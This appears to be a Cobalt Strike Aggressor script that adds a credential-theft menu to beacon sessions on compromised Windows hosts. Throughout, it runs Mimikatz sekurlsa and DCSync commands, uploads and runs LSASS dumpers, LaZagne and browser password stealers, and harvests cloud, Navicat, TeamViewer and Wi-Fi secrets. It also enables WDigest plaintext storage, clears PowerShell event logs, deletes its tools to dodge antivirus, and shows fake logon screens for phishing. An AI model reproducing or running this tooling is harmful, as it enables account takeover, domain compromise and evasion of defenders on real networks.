menu "Credential acquisition" {
  menu "Mimikatz Related" {
    item "Logonpasswords" {
			blog($1, "\c9=========== Logonpasswords ==========");
      $bid = $1['@'];
      bmimikatz($bid, "sekurlsa::logonpasswords");
    }
    
    item "Krbtgt hash" {
			blog($1, "\c9=========== Krbtgt hash ==========");
      $bid = $1['@'];
      $dialog = dialog("Krbtgt NTLM-Hash" , %(domain => "xxx.com" , user => "krbtgt", bid => $bid), &krbtgt);
      dialog_description($dialog, "Use Mimikatz to read the Krbtgt of accounts NTLM-Hash。");
      drow_text($dialog, "domain", "Domain: ");
      drow_text($dialog, "user", "User: ");
      dbutton_action($dialog, "Run");
      dialog_show($dialog);
    }
    sub krbtgt{
      $domain = $3['domain'];
      $user = $3['user'];
      bmimikatz($bid, "lsadump::dcsync /domain:$domain /user:$user");
    }

    menu "Mimikatz-DCSync" {
      item "DCSync" {
			blog($1, "\c9=========== Mimikatz-DCSync Users ==========");
        $dialog = dialog("DomainInfo" , %(bid => $1['@'] , domain => "Domain Name" , user => "User") , lambda({ bdcsync($3["bid"] , $3["domain"] , $3["user"]) }));
        dialog_description($dialog,"Use Mimikatz to get the password hash of a given user hash");
        drow_text($dialog,"bid","Bid:");
        drow_text($dialog,"domain","Domain:");
        drow_text($dialog,"user","User:");
        dbutton_action($dialog,"Exploit");
        dialog_show($dialog);
      }
      item "All Users" {
			blog($1, "\c9=========== Mimikatz-DCSync All Users ==========");
        $dialog = dialog("DomainInfo", %(bid => $1['@'] , domain => "域名") , lambda({ bdcsync($3["bid"] , $3["domain"])}));
        dialog_description($dialog, "获取全部用户的密码Hash");
        drow_text($dialog, "domain","Domain:");
        dbutton_action($dialog,"Exploit");
        dialog_show($dialog);

      }
    }
    item "Mimikatz WDigest Credentials" {
			blog($1, "\c9=========== Mimikatz WDigest Credentials ==========");
      local('$bid');
        foreach $bid ($1){
          wdigest($bid);
        }
    }    
    item "Mimikatz Kerberos Credentials" {
			blog($1, "\c9=========== Mimikatz Kerberos Credentials ==========");
      local('$bid');
        foreach $bid ($1){
          kerberos($bid);
        }
    }
    item "Mimikatz MSV LM & NTLM Passwords" {
			blog($1, "\c9=========== Mimikatz MSV LM & NTLM Passwords ==========");
      local('$bid');
        foreach $bid ($1){
          msv($bid);
        }
    }
    item "Mimikatz TsPkg Passwords" {
			blog($1, "\c9=========== Mimikatz TsPkg Passwords ==========");
      local('$bid');
        foreach $bid ($1){
          tspkg($bid);
        }
    }
    item "Mimikatz LiveSSP passwords" {
			blog($1, "\c9=========== Mimikatz LiveSSP passwords ==========");
      local('$bid');
        foreach $bid ($1){
          livessp($bid);
        }
    }
    item "Mimikatz SSP passwords" {
			blog($1, "\c9=========== Mimikatz SSP passwords ==========");
      local('$bid');
        foreach $bid ($1){
          ssp($bid);
        }
      }

    item "Mimikatz Dump Trust" {
			blog($1, "\c9=========== Mimikatz Dump Trust ==========");
      local('$bid');
        foreach $bid ($1){
          trust($bid);
        }
    }

    item "Mimikatz Backup Keys" {
			blog($1, "\c9=========== Mimikatz Backup Keys ==========");
      local('$bid');
        foreach $bid ($1){
          backupkeys($bid);
        }
    }

    item "Mimikatz Tickets" {
			blog($1, "\c9=========== Mimikatz Tickets ==========");
      local('$bid');
        foreach $bid ($1){
          tickets($bid);
        }
    }

    item "Mimikatz ekeys" {
			blog($1, "\c9=========== Mimikatz ekeys ==========");
      local('$bid');
        foreach $bid ($1){
          ekeys($bid);
        }
      }

    item "Mimikatz DPAPI" {
			blog($1, "\c9=========== Mimikatz DPAPI ==========");
      local('$bid');
        foreach $bid ($1){
          dpapi($bid);
        }
    }

    item "Mimikatz DPAPI System Secret" {
			blog($1, "\c9=========== Mimikatz DPAPI System Secret ==========");
      local('$bid');
        foreach $bid ($1){
          dpapisystem($bid);
        }
    }

    item "Mimikatz Credential Manager" {
			blog($1, "\c9=========== Mimikatz Credential Manager ==========");
      local('$bid');
        foreach $bid ($1){
          credman($bid);
        }
    }
    sub wdigest{
      bmimikatz($1, "sekurlsa::wdigest");
    }
    sub kerberos{
      bmimikatz($1, "sekurlsa::kerberos");
    }
    sub msv{
      bmimikatz($1, "sekurlsa::msv");
    }
    sub tspkg{
      bmimikatz($1, "sekurlsa::tspkg");
    }
    sub livessp{
      bmimikatz($1, "sekurlsa::livessp");
    }
    sub ssp{
      bmimikatz($1, "sekurlsa::ssp");
    }
    sub trust{
      bmimikatz($1, "sekurlsa::trust");
    }
    sub backupkeys{
      bmimikatz($1, "sekurlsa::backupkeys");
    }
    sub tickets{
      bmimikatz($1, "sekurlsa::tickets");
    }
    sub ekeys{
      bmimikatz($1, "sekurlsa::ekeys");
    }
    sub dpapi{
      bmimikatz($1, "sekurlsa::dpapi");
    }
    sub dpapisystem{
      bmimikatz($1, "sekurlsa::dpapi");
    }
    sub credman{
      bmimikatz($1, "sekurlsa::credman");
    }    
  }

  menu "lsass DumpHash Related" {
    menu "LsassDump (WinAPI)" {   # https://github.com/Ryze-T/Windows_API_Tools
      item "Upload LsassDump" {
        blog($1, "\c9=========== Upload LsassDump ==========");
        $bid = $1;
        $dialog = dialog("Upload LsassDump", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &LDupload);
        dialog_description($dialog, "Read using WindowsAPI lsass.exe，In order to ensure the effect of anti-kill, please delete it in time after the successful Dump!");
        drow_text($dialog, "UploadPath",  "Upload path: ");
        dbutton_action($dialog, "Upload");
        dialog_show($dialog);
      }
      sub LDupload{
        bcd($bid, $3['UploadPath']);
        if (-is64 $bid['id']) {
          bupload($bid, script_resource("/scripts/PassCapture/LsassDump/x64/LsassDump.exe"));
        }else{
          bupload($bid, script_resource("/scripts/PassCapture/LsassDump/x86/LsassDump.exe"));
        }
        btask($bid, "Use WindowsAPI to read lsass.exe, in order to ensure the effect of free kill please Dump successfully deleted in time!");
      }   
      item "Run LsassDump" {
        blog($1, "\c9=========== Run LsassDump ==========");
        bshell($bid, "LsassDump.exe");
      }
      item "Delete LsassDump" {
        blog($1, "\c9=========== Delete LsassDump ==========");
        local('$bid');
        foreach $bid ($1){
          bshell($1, "taskkill -f /im LsassDump.exe & del /f /s /q LsassDump.exe & del /f /s /q 1.dmp");
        }
      }
    }
    item "SharpMimidump (remote reading).dmp）" {
        blog($1, "\c9=========== SharpMimidump (remote reading).dmp） =========="); # https://github.com/cube0x0/Mimidump
      btask($bid, "使用 Mimidump Remote Read Dump of C:\\Windows\\Temp\\1.dmp（.net 4.5）");
      bexecute_assembly($1, script_resource('/scripts/PassCapture/Minidump.exe') ,"C:\\Windows\\Temp\\1.dmp");
    }
    item "Internal-Monologue" {
        blog($1, "\c9=========== Internal-Monologue ==========");# Reference https://3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-Net-NTLMv1%E4%BB%8B%E7%BB%8D
      local('$bid');
          foreach $bid ($1){
          internal_monologue($bid);
          }
    }
    sub internal_monologue{
      $binary = script_resource("/scripts/PassCapture/InternalMonologue.exe");
      $help = "Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS";
      beacon_command_register("lazagne", $help, "Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS.\n\n$help");
      if(!-exists $binary)
      {
        berror($1, "InternalMonologue binary cannot be found at $binary");
        return;
      }
      $args = "-Downgrade True -Verbose True";
      bexecute_assembly($1, $binary, $args);
    }  
    item "DumpLsassMemory"{
        $dialog = dialog("DumpLsassMemory",%(bid => $1["@"] , pid => "1024") ,&DumpLsassMemorys);
      dialog_description($dialog,"Please enter Lsass's pid");
      drow_text($dialog,"pid","pid:");
      dbutton_action($dialog,"Exploit");
      dialog_show($dialog);
    }
    sub DumpLsassMemorys{
        $binary = script_resource("/scripts/PassCapture/MiniDumpLsass.exe");
        bexecute_assembly($3["bid"],$binary,$3['pid']);
    }

    item "CVE-2021-36934"{
      $binary = script_resource("/scripts/PassCapture/CVE-2021-36934.exe");
      bexecute_assembly($1["@"],$binary);
    }
  }  
  separator();

	menu "LaZagne Retrieve host password" {
    item "Upload LaZagne" {
			blog($1, "\c9=========== Upload LaZagne ==========");
      $bid = $1;
      $dialog = dialog("Upload lazagne", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &lazagne);
      dialog_description($dialog, "LaZagne Not kill-free, please run it on a machine without AV. Project address：https://github.com/AlessandroZ/LaZagne");
      drow_text($dialog, "UploadPath",  "Upload path: ");
      dbutton_action($dialog, "Upload");
      dialog_show($dialog);
    }
    sub lazagne{
      bcd($bid, $3['UploadPath']);
			bupload($bid, script_resource("/scripts/PassCapture/lazagne.exe"));
    }
    item "Run LaZagne" {
			blog($1, "\c9=========== Run LaZagne ==========");
      bshell($bid, "lazagne.exe all");
    }
    item "Delete LaZagne" {
			blog($1, "\c9=========== Delete LaZagne ==========");
      local('$bid');
      foreach $bid ($1){
        bshell($1, "taskkill -f /im lazagne.exe & del /f /s /q lazagne.exe");
        bshell($bid, "del C:\\Windows\\Temp\\lazagne.exe");
      }
    }
  }

  menu "Capture browser data and passwords" {
    menu "HackBrowserData" { 
      item "Upload HackBrowserData" {
			blog($1, "\c9=========== Upload HackBrowserData ==========");
        $bid = $1;
        $dialog = dialog("Upload HackBrowserData", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &hack-browser-data);
        dialog_description($dialog, "Full platform support, software address：https://github.com/moonD4rk/HackBrowserData");
        drow_text($dialog, "UploadPath",  "Upload path: ");
        dbutton_action($dialog, "Upload");
        dialog_show($dialog);
      }
      sub hack-browser-data {
        bcd($bid, $3['UploadPath']);
        if (-is64 $bid['id']) {
          bupload($bid, script_resource("/scripts/PassCapture/HackBrowserData/x64/hack-browser-data.exe"));
        }else{
          bupload($bid, script_resource("/scripts/PassCapture/HackBrowserData/x86/hack-browser-data.exe"));
        }         
      }

      item "Run HackBrowserData" {
			blog($1, "\c9=========== Run HackBrowserData ==========");
        $bid = $1['@'];
        $Dialog = dialog("Run HackBrowserData",%(bid => $bid),&hack-browser-data_run);
        dialog_description($Dialog, "After running, the results folder will be created in the current directory and all the results will be in it");
        dbutton_action($Dialog, "Run");
        btask($bid, "After running, the results folder will be created in the current directory and all the results will be in it", "");
        dialog_show($Dialog);
        
      }
      sub hack-browser-data_run{
        bshell($bid, "hack-browser-data.exe");
      }

      item "Delete exe and resuls folders" {
			blog($1, "\c9=========== Delete the exe and resuls folders ==========");
        local('$bid');
        foreach $bid ($1){
          bshell($1, "del /f /s /q hack-browser-data.exe && rmdir /s /q results");
        }
      }
    }
    menu "360SafeBrowsergetpass" {
      sub getMachineGuid{
        $arch = barch($1);
        if ($arch == 'x64'){
        breg_queryv($1, "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", "x64");
        }
        else{
        breg_queryv($1, "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", "x86");
        breg_queryv($1, "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", "x64");
        }
      }

      sub SafeBrowsergetpass {
        bshell($bid, 'reg query HKEY_CLASSES_ROOT\360seURL\shell\open\command|findstr exe');
      }

      item "Query related keys"{
          $bid = $1['@'];
          SafeBrowsergetpass($bid);
          getMachineGuid($bid);
      }

      on beacon_output {
        $magicstring = "360se6\\Application\\360se.exe";
        $magicstring2 = "MachineGuid";

        if ($magicstring isin $2){
        $length = strlen($2);
        $last = lindexOf($2, ":");
        $res = substr($2, $last - 1, $length - 32);
        $dbPath = "User Data\\Default\\apps\\LoginAssis\\assis2.db";
        $res = $res . $dbPath;

        bdownload($1, $res);
        blog($1,"360 SafeBrowser DB Downloading");
        }

        if ($magicstring2 isin $2){
        $lasta = lindexOf($2, "\nMachineGuid");
        $MachineGuid = substr($2, $lasta + 26, -1); 
        $beaconHost = beacon_info($1, "host");
        credential_add($empty,$MachineGuid, $empty, $empty, $beaconHost);
        blog($1,"MachineGuid Get Success");
        }
      }

      item "Safe360Browsergetpass" {
        blog($1, "\c9=========== Safe360Browsergetpass ==========");
        blog($1, "项目地址：https://github.com/hayasec/360SafeBrowsergetpass")
        bexecute_assembly($1, script_resource("/scripts/PassCapture/Safe360Browsergetpass.exe"),"/auto");      
      }
    }
    item "BrowserGhost" {
			blog($1, "\c9=========== BrowserGhost ==========");
      blog($1, "项目地址：https://github.com/QAX-A-Team/BrowserGhost")
      bexecute_assembly($1, script_resource("/scripts/PassCapture/BrowserGhost.exe"));
    }
    item "SharpWeb" {
			blog($1, "\c9=========== SharpWeb ==========");
      $bid = $1['@'];
      $dialog = dialog("SharpChromium", %(bid => $bid), &SharpWeb);
      dialog_description($dialog,"Available from Google Chrome, Mozilla Firefox andMicrosoft Internet Explorer/EdgeRetrieve saved browser credentials. Project Address：https://github.com/djhohnstein/SharpWeb");
      drow_combobox($dialog, "Type", "all/chrome/firefox/edge", @("all", "chrome","firefox","edge"));
      dbutton_action($dialog, "Run");
      dialog_show($dialog);
    }
    sub SharpWeb {
      bexecute_assembly($bid, script_resource("/scripts/PassCapture/SharpWeb.exe"), $3['Type']);
    }
    item "SharpChromium" {
			blog($1, "\c9=========== SharpChromium ==========");
      $bid = $1['@'];
      $dialog = dialog("SharpChromium", %(bid => $bid), &SharpChromium);
      dialog_description($dialog,".NET 4.0 CLR project for retrieving Chromium data such as cookies, history and saved logins. Project address：https://github.com/djhohnstein/SharpChromium");
      drow_combobox($dialog, "Type", "all/cookies/history/logins", @("all", "cookies","history","logins"));
      dbutton_action($dialog, "Run");
      dialog_show($dialog);
    }
    sub SharpChromium {
      bexecute_assembly($bid, script_resource("/scripts/PassCapture/SharpChromium.exe"), $3['Type']);
    }   
  }

  menu "Host program-related passwords" {
    item "SunFlower(Querying registry keys)" {
      blog($1, "\c9=========== SunFlower(Querying registry keys) ==========");
      bshell!($1, "reg query HKEY_USERS\\.DEFAULT\\Software\\Oray\\SunLogin\\SunloginClient\\SunloginInfo || reg query HKEY_USERS\\.DEFAULT\\Software\\Oray\\SunLogin\\SunloginClient\\SunloginGreenInfo || echo 旧版向日葵 C:\\Program Files\\Oray\\SunLogin\\SunloginClient\\config.ini && echo 绿色便携版 C:\\ProgramData\\Oray\\SunloginClient\\config.ini");
    }
    item "SharpCloud(Get Cloud Credentials)" {
			blog($1, "\c9=========== SharpCloud(Get Cloud Credentials) ==========");
      $bid = $1['@'];
      $dialog = dialog("Get Cloud Credentials", %(bid => $bid), &SharpCloud);
      dialog_description($dialog, "Used to check if there is a relationship with AWS, Microsoft Azure and Google ComputeRelated voucher documents. Project Address：https://github.com/chrismaddalena/SharpCloud");
      drow_combobox($dialog, "type", "type:", @("all","aws","azure","gcloud"));
      dbutton_action($dialog, "Run");
      dialog_show($dialog);
    }
    sub SharpCloud {
      $arg = join(' ',  @($3['type']));
      bexecute_assembly($bid, script_resource("/scripts/PassCapture/SharpCloud.exe"), $arg);
    }
    
    item "Navicat-Password" {
			blog($1, "\c9=========== Navicat-Password ==========");
      local('$bid');
          foreach $bid ($1){
          navicat_password($bid);
          }
    }
    sub navicat_password{
      $binary = script_resource("/scripts/PassCapture/navicatpwd.exe");
      $help = "Automatic access to Navicat connection information and password";
      beacon_command_register("navicat", $help, "Use: navicat <Automatically export all and decrypt>\nnavicat 12 <Decrypt with 12 algorithms> OR navicat 15057D7BA390\nnavicat 15057D7BA390 12<Decrypt the password of parameter one with 12 algorithm>\n\n$help");
      if(!-exists $binary)
      {
        berror($1, "Navicat binary cannot be found at $binary");
        return;
      }
      bexecute_assembly($1, $binary);
    }

    menu "SharpDecryptPwd(from uknowsec)" {
      item "SharpDecryptPwd" {
			blog($1, "\c9=========== SharpDecryptPwd ==========");
        $bid = $1['@'];
        $dialog = dialog("SharpDecryptPwd", %(type => "-NavicatCrypto",bid => $bid), &SharpDecryptPwd);
        dialog_description($dialog,"Parsing of some programs whose passwords have been saved on Windwos systems, including：Navicat,TeamViewer,FileZilla,WinSCP,XmangagerSeries products (Xshell,Xftp). Project address：https://github.com/uknowsec/SharpDecryptPwd");
        drow_combobox($dialog, "type", "Type:", @("-NavicatCrypto", "-TeamViewer", "-FileZilla","-WinSCP"));
        dbutton_action($dialog, "Run");
        dialog_show($dialog);
      }
      item "Xmangager" {
			blog($1, "\c9=========== Xmangager ==========");
        $bid = $1['@'];
        $dialog = dialog("Xmangager", %(type => "-Xmangager",path => "D:\\xshell\\Xshell\\Sessions",bid => $bid), &Xmangager);
        dialog_description($dialog, "XmangagerSeries of products, such as：Xshell,Xftp。");
        drow_combobox($dialog, "type", "Type:", @("-Xmangager"));
        drow_text($dialog, "path", "Sessions Path:  ");
        dbutton_action($dialog, "Run");
        dialog_show($dialog);
      }
    }
    sub SharpDecryptPwd {
      bexecute_assembly($bid, script_resource("/scripts/PassCapture/SharpDecryptPwd.exe"), $3['type']);
    }
    sub Xmangager {
      $arg = join(' ', @($3['type'],"-p",$3['path']));
      bexecute_assembly($bid, script_resource("/scripts/PassCapture/SharpDecryptPwd.exe"), $arg);
    }

    menu "SharpDecryptPwd(from RcoIl)" {
      item "SharpDecryptPwd40" {
			blog($1, "\c9=========== SharpDecryptPwd40 ==========");
        $bid = $1['@'];
        $dialog = dialog("SharpDecryptPwd40", %(type => "-Navicat",bid => $bid), &SharpDecryptPwd40);
        dialog_description($dialog,"Currently supported Navicat Series, Xmanager Series, TeamViewer, FileZilla Client, Foxmail, RealVNC server, TortoiseSVN, WinSCP, Chrome full version. Project Address：https://github.com/RcoIl/SharpDecryptPwd");
        drow_combobox($dialog, "type", "Type:", @("-Navicat", "-TeamViewer", "-FileZilla","-WinSCP","-Foxmail","-RealVNC","-TortoiseSVN","-Chrome"));
        dbutton_action($dialog, "Run");
        dialog_show($dialog);
      }
      item "Xmangager40" {
			blog($1, "\c9=========== Xmangager40 ==========");
        $bid = $1['@'];
        $dialog = dialog("Xmangager", %(type => "-Xmanager",path => "D:\\xshell\\Xshell\\Sessions",bid => $bid), &Xmangager40);
        dialog_description($dialog, "Xmangager series products, such as: Xshell,Xftp。");
        drow_combobox($dialog, "type", "Type:", @("-Xmanager"));
        drow_text($dialog, "path", "Sessions Path:  ");
        dbutton_action($dialog, "Run");
        dialog_show($dialog);
      }
    }
    sub SharpDecryptPwd40 {
      bexecute_assembly($bid, script_resource("/scripts/PassCapture/SharpDecryptPwd40.exe"), $3['type']);
    }
    sub Xmangager40 {
      $arg = join(' ', @($3['type'],"-p",$3['path']));
      bexecute_assembly($bid, script_resource("/scripts/PassCapture/SharpDecryptPwd40.exe"), $arg);
    }
  }
  item "Net-GPPPassword" {
			blog($1, "\c9=========== Net-GPPPassword (Group Policy Account Credentials) ==========");
    blog($1, "NET implementation of Get-GPPPassword. retrieves plaintext passwords and other information for accounts pushed through Group Policy preferences. The technology is old, but still useful in environments where domains were created a long time ago. Project Address：https://github.com/outflanknl/Net-GPPPassword")
    bexecute_assembly($1, script_resource("/scripts/PassCapture/Net-GPPPassword_dotNET_v2.exe"), "");
  }
  menu "Detect WIFI password" {
    item "Get the connected WIFI" {
			blog($1, "\c9=========== Get the connected WIFI ==========");
      local('$bid');
      foreach $bid ($1){
        bshell($1, "netsh wlan show profiles");
      }
    }
    item "Get WIFI password" {
			blog($1, "\c9=========== Get WIFI password ==========");
      prompt_text("Enter the wifi ssid? name: ", "", lambda({
        bshell(@ids, "netsh wlan show profile name=\"$1\" key=clear");
      }, @ids => $1));
    }
    item "SharpWifiGrabber (Retrieve Wi-Fi password)" {
			blog($1, "\c9=========== SharpWifiGrabber (Retrieve Wi-Fi password) ==========");
      blog($1, "Project Address：https://github.com/r3nhat/SharpWifiGrabber")
      bexecute_assembly($1, script_resource('/scripts/PassCapture/SharpWifiGrabber.exe'), "");
    }
  }

  menu "Change registry to store plaintext passwords with wdigest" {
    item "Show plaintext" {
			blog($1, "\c9=========== Show plaintext ==========");
      local('$bid');
      foreach $bid ($1){
        bshell($1, "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f");
      }
    }
    item "Forced lock screen" {
			blog($1, "\c9=========== Forced lock screen ==========");
      local('$bid');
      foreach $bid ($1){
        blog($1, "Lock screen being executed");
        bpowershell_import($bid, script_resource("/scripts/PassCapture/lock-screen.ps1"));
        bpowerpick($bid,"Lock-WorkStation");
        bshell($bid,"wevtutil cl \"Windows PowerShell\"");
      }
    }
    item "Disable plaintext passwords" {
			blog($1, "\c9=========== Hide plaintext ==========");
      local('$bid');
      foreach $bid ($1){
        bshell($1, "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f");
      }
    }
  }
    
  menu "Phishing password theft" {
    item "FakeTheScreen" {
			blog($1, "\c9=========== FakeTheScreen ==========");
      $dialog = dialog("FakeTheScreen",%(bid => $1["@"] , os => "Win7") ,&FakerScreen);
      dialog_description($dialog,"The forgery effect is not satisfactory Use with caution!!! Select the Windows system corresponding to the target host： ");
      drow_combobox($dialog,"os","System:",@("Win7","Win10"));
      dbutton_action($dialog,"Exploit");
      dialog_show($dialog);
    }
    sub FakerScreen {
      if ($3["os"] eq "Win7"){
        bexecute_assembly($3["bid"],script_resource("/scripts/PassCapture/fakelogonscreen_trunk/DOTNET35/FakeLogonScreen.exe"));
      }
      else{
        bexecute_assembly($3["bid"],script_resource("/scripts/PassCapture/fakelogonscreen_trunk/FakeLogonScreen.exe"));
      }
    }

    item "CredPhisher(Authentication Login Box Phishing)" {
			blog($1, "\c9=========== CredPhisher(Authentication Login Box Phishing) ==========");
      $bid = $1['@'];
      $dialog = dialog("CredPhisher", %(content => "Security Certification",bid => $bid), &CredPhisher);
      dialog_description($dialog, "Pop-up security authentication login box for phishing. windows10 tested successfully. Project Address：https://github.com/matterpreter/OffensiveCSharp/tree/master/CredPhisher");
      drow_text($dialog, "content", "content:");
      dbutton_action($dialog, "Run");
      dialog_show($dialog);
    }
    sub CredPhisher {
      $arg = join('',@("",$3['content']));
      bexecute_assembly($bid, script_resource("/scripts/PassCapture/CredPhisher.exe"), $arg);
    }
  }
}
